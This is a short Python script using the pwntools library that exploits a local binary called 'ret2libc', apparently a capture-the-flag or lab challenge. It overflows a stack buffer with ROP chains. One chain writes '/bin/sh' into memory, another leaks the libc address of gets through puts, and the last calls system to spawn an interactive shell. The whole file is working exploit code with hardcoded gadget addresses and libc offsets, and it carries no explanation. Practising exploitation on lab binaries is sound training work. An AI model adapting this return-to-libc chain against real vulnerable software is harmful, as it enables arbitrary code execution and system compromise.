from pwn import *

context.arch = 'amd64'

io = process('./ret2libc')

pop_rdi = 0x40114a
ret = 0x401016
gets_got = 0x404008
puts_plt = 0x401030
gets_plt = 0x401040
main = 0x40114f

io.recvline()
io.sendline(b'a'*0x18 + flat([pop_rdi, 0x404100, gets_plt, main]))
io.sendline('/bin/sh')

io.recvline()
io.sendline(b'a'*0x18 + flat([pop_rdi, gets_got, puts_plt, main]))

gets = u64(io.recvline(keepends=False).ljust(8, b'\0'))
libc = gets - 0x76f30
system = libc + 0x4c330

io.recvline()
io.sendline(b'a'*0x18 + flat([ret, pop_rdi, 0x404100, system]))

io.interactive()
